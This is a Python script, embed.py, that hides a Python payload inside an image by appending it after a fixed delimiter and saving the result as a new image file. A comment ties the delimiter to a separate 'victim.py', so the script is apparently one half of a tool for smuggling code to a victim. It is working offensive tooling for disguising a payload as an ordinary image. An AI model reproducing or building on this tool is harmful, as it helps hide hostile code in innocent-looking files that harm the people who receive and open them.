# embed.py
# Author: cs @KaliLincox
# Date: 01/06/2021

import sys
import os

DELIMITER = b'********'  # must be the same in victim.py


def main(argc, argv):
    if argc < 3:
        print(f'usage: py {argv[0]} <image> <payload>')
        return

    img_path = argv[1]
    payload_path = argv[2]

    # check if image file exists
    if not os.path.exists(img_path) or not os.path.isfile(img_path):
        print('error: image file not found.')
        return

    # check if Python payload file exists
    if not os.path.exists(payload_path) or not os.path.isfile(payload_path) or not payload_path.endswith('.py'):
        print('error: python payload file not found.')
        return

    # read payload file
    with open(payload_path, 'rb') as file:
        payload_data = file.read()

    # read image data
    with open(img_path, 'rb') as file:
        image_data = file.read()

    ext = os.path.splitext(img_path)[1]

    # embed payload to image data
    with open(f'image_payload{ext}', 'wb') as file:
        file.write(image_data + DELIMITER + payload_data)

    print(f'success: payload embedded!')


if __name__ == '__main__':
    main(len(sys.argv), sys.argv)
